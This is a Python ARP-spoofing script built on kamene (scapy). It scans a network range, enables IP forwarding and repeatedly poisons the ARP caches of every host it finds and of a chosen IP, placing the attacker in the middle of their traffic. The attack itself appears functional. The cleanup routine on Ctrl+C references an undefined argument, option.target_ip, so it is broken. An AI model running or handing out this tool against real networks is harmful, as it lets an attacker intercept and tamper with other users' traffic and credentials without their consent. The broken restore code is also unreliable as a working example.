#!/usr/bin/python
#kamene is scapy just an FYI

import kamene.all as scapy
import argparse
import time
import subprocess


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)



def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="give the ip range you want")
    parser.add_argument("-s", "--spoof", dest="spoof_ip", help="give the ip of the target you want to spoof")
    (option) = parser.parse_args()
    return option


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list=[]
    for element in answered_list:
        client_dict={"ip":element[1].psrc, "mac":element[1].hwsrc}
        clients_list.append(client_dict)

    return clients_list


if __name__ == "__main__":
    option = get_arguments()
    number_packets_sent = 0
    subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    result_list = scan(option.target)
    try:
        while True:
            for client in result_list:
                if client["ip"] == option.spoof_ip and client["ip"][-3:]=="254":
                    pass
                else:
                    spoof(client["ip"], option.spoof_ip)
                    spoof(option.spoof_ip, client["ip"])
                    number_packets_sent += 2
                    print("\r  [+] Packets Sent: " + str(number_packets_sent), end="")
                    time.sleep(2)
    except KeyboardInterrupt:
        for client in result_list:
            if client["ip"] == option.spoof_ip and client["ip"][-3:]=="254":
                pass
            else:
                restore(option.target_ip, option.spoof_ip)
                restore(option.spoof_ip,option.target_ip)
        print("\n  [+] Dtected Ctrl+C -------> Quitting.")
